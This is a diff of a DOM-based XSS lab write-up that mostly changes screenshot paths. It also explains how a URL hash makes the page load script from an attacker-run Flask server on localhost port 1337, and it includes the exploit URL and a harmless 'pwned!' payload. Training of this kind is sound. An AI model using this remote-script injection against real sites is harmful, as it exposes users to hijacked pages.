@@ -20,11 +20,11 @@ Now that the app is running let's go hacking!
 
 The application shows no input field or anything else we can interact with. Let's inspect the source code.
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/4.png)
+![](../../.gitbook/assets/python/XSS-DOM-2/1.png)
 
 Inspecting the source code of the application.
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/5.png)
+![](../../.gitbook/assets/python/XSS-DOM-2/2.png)
 
 ```javascript
 function loadWelcomeMessage() {
@@ -49,7 +49,7 @@ endpoint = location.hash.slice(5);
 
 Declaring endpoint variable which takes the url, whatever is after the hash(#) and using slice to remove the first 4 characters after that. If the endpoint exists it will load the js file from there.
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/1.png)
+![](../../.gitbook/assets/python/XSS-DOM-2/3.png)
 
 ## Exploitation
 
@@ -80,7 +80,7 @@ $ pip3 install flask
 Now we need to create our malicous js file, save the following snippet code into /static/js/welcome.js
 
 ```javascript
-document.getElementsByClassName("panel-body")[0].innerText = "XSS-DOM-2";
+document.getElementsByClassName("panel-body")[0].innerText = "pwned!";
 ```
 
 We are ready to start our server:
@@ -89,7 +89,7 @@ We are ready to start our server:
 $ python3 evil_server.py
 ```
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/2.png)
+![](../../.gitbook/assets/python/XSS-DOM-2/4.png)
 
 Now we can serve our malicious js file to the application
 
@@ -97,7 +97,7 @@ Now we can serve our malicious js file to the application
 http://0.0.0.0:5000/#xxxxhttp://0.0.0.0:1337
 ```
 
-![](../../.gitbook/assets/nodejs/XSS-DOM-2/3.png)
+![](../../.gitbook/assets/python/XSS-DOM-2/5.png)
 
 ## Additional sources
 
